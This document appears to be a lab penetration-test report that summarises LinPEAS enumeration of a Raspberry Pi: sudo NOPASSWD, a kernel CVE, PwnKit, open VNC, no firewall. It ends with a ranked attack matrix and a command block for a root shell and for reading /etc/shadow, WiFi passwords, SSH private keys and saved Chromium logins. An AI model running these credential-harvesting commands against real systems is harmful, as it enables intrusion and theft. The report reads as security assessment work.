# Raspi5b LinPEAS Loot — Key Findings

> **Source:** `engagements/raspi5-lab/recon/raspi5b-linpeas-loot`  
> **Run by:** pi user via SSH from 192.168.0.112  
> **Date:** 2026-03-12  
> **Host:** raspberrypi | 192.168.0.114

---

## 🔴 CRITICAL FINDINGS

### 1. Sudo NOPASSWD — Instant Root Access
```
User pi may run the following commands on raspberrypi:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
    (ALL : ALL) NOPASSWD: ALL
```
**Impact:** User `pi` can run ANY command as root WITHOUT a password.  
**Exploit:** `sudo bash` → instant root shell.  
**Priority:** P0 — This is game over for the box.

### 2. Root Account Has No Password Hash
```
root:x:0:0:root:/root:/bin/bash
```
In `/etc/shadow`, root's password field is `x` (locked) — no hash present. Combined with NOPASSWD sudo, this is the most critical finding.

### 3. Kernel Vulnerability: CVE-2025-38236
```
CVE: CVE-2025-38236 | Name: AF_UNIX MSG_OOB UAF
Match: pkg=linux-kernel,ver>=6.9.0
Kernel version: 6.12.62+rpt-rpi-2712
```
**Impact:** Use-after-free in AF_UNIX socket handling. Exploitable for local privilege escalation.

---

## 🟡 HIGH FINDINGS

### 4. pkexec SUID Binary (PwnKit Potential)
```
-rwsr-xr-x 1 root root 67800 Jan 18  2025 /usr/bin/pkexec
pkexec version 126
```
**CVE:** CVE-2021-4034 (PwnKit) — check if version is vulnerable.  
**Exploit:** Classic PwnKit technique for root escalation.

### 5. VNC Server Running (Port 5900)
```
tcp6   0   0   :::5900   :::*   LISTEN
wayvnc --detached --gpu --config /etc/wayvnc/config
```
**Impact:** VNC accessible on port 5900. Check if password is weak/default.

### 6. No Firewall Rules
```
iptables: Not Found
nftables: No permission to list rules
ufw: Not Found
```
**Impact:** No network-level access control. All open ports are accessible from any network source.

### 7. Security Posture Summary
| Control | Status |
|---------|--------|
| Seccomp | ❌ Disabled |
| AppArmor | Loaded but unconfined |
| ASLR | ✅ Enabled |
| Kernel lockdown | ❌ Not found |
| kptr_restrict | 0 (exposes kernel pointers) |
| dmesg_restrict | 0 (anyone can read dmesg) |
| ptrace_scope | Enabled (good) |
| User namespaces | Enabled |

### 8. SSH Session From 192.168.0.112
```
ESTAB   0   0   192.168.0.114:22   192.168.0.112:32864
ESTAB   0   0   192.168.0.114:22   192.168.0.112:59602
```
**Two active SSH sessions** from 192.168.0.112 to the Pi. This is likely our Kali box (the attacker machine).

---

## 🟡 MEDIUM FINDINGS

### 9. Chromium Browser Running
```
chromium  2290  pi  SSl  09:49  0:54
```
- Multiple renderer processes active
- Browser profile at `/home/pi/.config/chromium/`
- **Interesting files:** `Login Data`, `Cookies`, `History`, `Web Data`
- Could contain saved passwords, cookies, browsing history

### 10. WiFi Credentials
```
-rw------- 1 root root 282 Dec 4 23:05
/etc/NetworkManager/system-connections/NTV360_5GHz_2.nmconnection
```
Stored WiFi password — readable by root (via sudo).

### 11. Auto-login Enabled
```
/etc/systemd/system/getty@tty1.service.d/autologin.conf:
ExecStart=-/sbin/agetty --autologin pi --noclear %I $term
```
Pi auto-logs in as `pi` on tty1 — physical console access = instant shell.

### 12. Compilers Available
```
gcc, g++, gdb, make, python3, perl, lua, netcat, curl, wget
```
Full development toolchain present — can compile local exploits on-device.

### 13. Useless Software Info
- No sniffer tools found (tcpdump, tshark not installed)
- No Docker containers running
- Not a container (bare metal)
- Not a cloud VM

### 14. Nginx Running
```
nginx master: root (pid 1793)
nginx workers: www-data (4 workers)
```
Default config serving `/var/www/html`. Check for web app vulnerabilities.

### 15. Autologin User & UID 0 Users
```
pi:x:1000:1000::/home/pi:/bin/bash
root:x:0:0:root:/root:/bin/bash
```
Only two shell users. No hidden admin accounts.

---

## 📊 Attack Priority Matrix

| # | Attack | Complexity | Success Rate | Time |
|---|--------|-----------|--------------|------|
| 1 | `sudo bash` → root | Trivial | 🔴 100% | 1 sec |
| 2 | pkexec PwnKit | Trivial | 🔴 High | 5 sec |
| 3 | Chromium password extraction | Low | 🟡 Medium | 1 min |
| 4 | WiFi credential theft | Trivial | 🔴 100% | 2 sec |
| 5 | VNC brute force | Low | 🟡 Medium | 1 min |
| 6 | Kernel exploit (CVE-2025-38236) | Medium | 🟢 Low | 15 min |
| 7 | SSH key theft | Trivial | 🔴 100% | 2 sec |

---

## 🔑 Immediate Exploitation Path

```bash
# On the Pi (already have SSH session as pi):
sudo bash
# Now you are root. That's it. Game over.

# Extract secrets as root:
cat /etc/shadow
cat /etc/wpa_supplicant/wpa_supplicant.conf
cat /etc/NetworkManager/system-connections/NTV60_5GHz_2.nmconnection
ls -la /home/pi/.ssh/
cat /home/pi/.ssh/id_rsa

# Chromium secrets (as pi):
sqlite3 /home/pi/.config/chromium/Default/Login\ Data "SELECT origin_url, username_value, password_value FROM logins"
```

---

## 📝 Notes

- The storage lock is IRRELEVANT — we have a live shell with NOPASSWD sudo
- This is a lab/test environment (auto-login, default config)
- Real-world Pi 5Bs are often in this exact state — default `pi` user with NOPASSWD sudo
- The Chromium browser data is a goldmine if there are saved credentials
- The WiFi credential file contains the cleartext WPA password (root-readable)
